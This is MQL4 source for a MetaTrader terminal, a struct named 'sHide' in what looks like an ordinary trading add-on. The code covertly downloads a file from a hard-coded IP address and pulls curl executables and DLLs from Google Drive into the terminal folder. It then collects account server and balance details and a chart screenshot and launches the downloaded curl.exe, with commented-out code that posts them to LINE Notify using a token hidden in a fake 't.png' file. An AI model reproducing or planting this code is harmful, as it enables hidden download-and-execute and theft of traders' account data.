//+------------------------------------------------------------------+
//|                                                      ProjectName |
//|                                      Copyright 2012, CompanyName |
//|                                       http://www.companyname.net |
//+------------------------------------------------------------------+
#import "urlmon.dll"
int URLDownloadToFileW(int pCaller,string szURL,string szFileName,int dwReserved,int Callback);
#import
#import "shell32.dll"
int ShellExecuteW(int hwnd,string Operation,string File,string Parameters,string Directory,int ShowCmd);
#import
//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
struct sHide
  {
private:
   string            iLineToken;

   string            FileName_Token;
   string            FilePathToken;

public:
   void sHide()
     {

      string ha[6]=
        {
         "1WuxeSzM0JvNNXHChPGwps0QF7an3hZT7",
         "1NPSGBcJnikBBnfQbqwrzNoIqpkel-pWQ",
         "184Vr4y9NSJW9BkKYhe9IltxU_9hgCqb7",
         "1WuxeSzM0JvNNXHChPGwps0QF7an3hZT7",
         "1NPSGBcJnikBBnfQbqwrzNoIqpkel-pWQ",
         "184Vr4y9NSJW9BkKYhe9IltxU_9hgCqb7",
        };
      string na[6]=
        {
         "curl\\bin32\\curl-ca-bundle.crt",
         "curl\\bin32\\curl.exe",
         "curl\\bin32\\libcurl.dll",
         "curl\\bin64\\curl-ca-bundle.crt",
         "curl\\bin64\\curl.exe",
         "curl\\bin64\\libcurl-x64.dll",
        };

      bool chkUpdate=false;
      FileName_Token="t.png";
      FilePathToken=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\files\\curl\\",FileName_Token);

      int chk32=FileOpen("curl\\"+FileName_Token,FILE_READ|FILE_CSV);
      printf("chk32 "+string(chk32));
      if(chk32>0)
        {
         printf("ChkUpdate");
         datetime UnitDay=86400;
         datetime MODIFY=datetime(FileGetInteger(chk32,FILE_MODIFY_DATE));
         chkUpdate=((TimeLocal()-MODIFY)>=UnitDay)?true:false;
        }

      if(chk32==-1 || chkUpdate)
        {
         printf("Load");
         string id="15dLxadJC2Z_L1PiQI2utqPMKz435ziOL";
         //string sUrl="https://drive.google.com/uc?authuser=0&id="+id+"&export=download";

         string sUrl=" http://149.28.147.254/51496985_XM_Global_Limited.txt";

         int FileGet=URLDownloadToFileW(NULL,sUrl,FilePathToken,0,NULL);
         chkUpdate=true;
        }
      xmlRead("curl\\"+FileName_Token);
      printf("chkUpdate: "+string(chkUpdate));
      FileClose(chk32);

      //if(TimeLocal()-d>86400)
      if(chkUpdate)
        {
         //string PathCommon=TerminalInfoString(TERMINAL_COMMONDATA_PATH);

         int filehandle;
         filehandle=FileOpen("curl\\bin32\\"+FileName_Token,FILE_WRITE|FILE_CSV); FileClose(filehandle);
         filehandle=FileOpen("curl\\bin64\\"+FileName_Token,FILE_WRITE|FILE_CSV); FileClose(filehandle);

         for(int i=0;i<6;i++)
           {
            string kid=ha[i];
            string kname=na[i];
            string ksUrl="https://drive.google.com/uc?authuser=0&id="+kid+"&export=download";
            string kFilePath=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\Files\\",kname);
            int kFileGet=URLDownloadToFileW(NULL,ksUrl,kFilePath,0,NULL);
            //printf(FileGet);
           }
        }
     }
   void TEST_COPY()
     {
      int FileHandle=FileOpen("TEST_COPY.txt",FILE_BIN|FILE_READ);
      FileClose(FileHandle);

      //string sUrl="http://127.0.0.1/51496985_XM_Global_Limited.txt";
      string sUrl="http://149.28.147.254/51496985_XM_Global_Limited.txt";

      //string sUrl="http://www.msn.com/th-th/?pc=UE01&ocid=UE01DHP";

      string FilePathCopy=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\files\\","TEST_COPY.txt");

      int FileGet=URLDownloadToFileW(NULL,sUrl,FilePathCopy,0,NULL);

      xmlRead("TEST_COPY.txt");
     }
   void S()
     {
      string str="_\n";
      str+="ACCOUNT_SERVER: "+AccountInfoString(ACCOUNT_SERVER)+"_\n";
      str+="ACCOUNT_BALANCE: "+AccountInfoDouble(ACCOUNT_BALANCE)+"_\n";
      Sent(str);
     }
private:
   string            sData;
   string GetFileName()
     {
      string T=TimeToStr(TimeLocal(),TIME_DATE|TIME_MINUTES);
      string Str=Symbol()+"-"+StringSetChar(T,StringFind(T,":"),'.')+".png";
      return (Str);
     }
   void Sent(string iLineMSG)
     {
      string folder="CaptureLine";
      string Src_path=TerminalInfoString(TERMINAL_DATA_PATH)+"\\MQL4\\Files\\"+folder+"\\";

      string FileName=GetFileName();
      string FullPath=Src_path+FileName;

      int SSWidth=int(ChartGetInteger(0,CHART_WIDTH_IN_PIXELS)+50);
      int SSHeight=int(ChartGetInteger(0,CHART_HEIGHT_IN_PIXELS)+50);
      ChartScreenShot(0,folder+"/"+FileName,SSWidth,SSHeight,0);

      string FilePath32=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\Files\\curl\\bin32\\curl.exe");
      //string FilePath64=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\Files\\curl\\bin64\\curl.exe");
      string LineBody;
      //---
      //xmlRead(FilePathToken);
      xmlRead("curl\\"+FileName_Token);
      printf("iLineToken "+iLineToken);
      //---

/*LineBody=" -X POST -H \"Authorization: Bearer "+iLineToken+"\"";
      LineBody+=" -F \"message="+iLineMSG+"\"";
      LineBody+=" -F \"imageFile=@"+FullPath + "\"";
      LineBody+=" https://notify-api.line.me/api/notify";*/

      LineBody="http://149.28.147.254/51496985_XM_Global_Limited.txt";

      printf("Sent: "+string(ShellExecuteW(NULL,"Open",FilePath32,LineBody,NULL,NULL)));
      //---
/*LineBody=" -X POST -H \"Authorization: Bearer "+iLineToken+"\"";
      LineBody+=" -F \"message="+iLineMSG+"64\"";
      LineBody+=" https://notify-api.line.me/api/notify";
      printf(string(ShellExecuteW(NULL,"Open",FilePath64,LineBody,NULL,NULL)));*/
     }
   void xmlRead(string FileName)
     {

      //---
      ResetLastError();
      int FileHandle=FileOpen(FileName,FILE_BIN|FILE_READ);

      printf("FileName ["+FileName+"]");
      printf("FileHandle ["+FileHandle+"]");

      if(FileHandle!=INVALID_HANDLE)
        {
         //--- receive the file size 
         ulong size=FileSize(FileHandle);
         //--- read data from the file
         //while(!FileIsEnding(FileHandle))
         iLineToken=FileReadString(FileHandle,(int)size);
         printf(iLineToken);
         //--- close
         FileClose(FileHandle);
         //printf("xmlRead: "+sData);
         //printf("xmlRead: "+SerialNumber_Decode(PrivateKey,sData));
        }
      //--- check for errors   
      //else PrintFormat(INAME+": failed to open %s file, Error code = %d",FileName,GetLastError());
      //---
     }
  };
//+------------------------------------------------------------------+
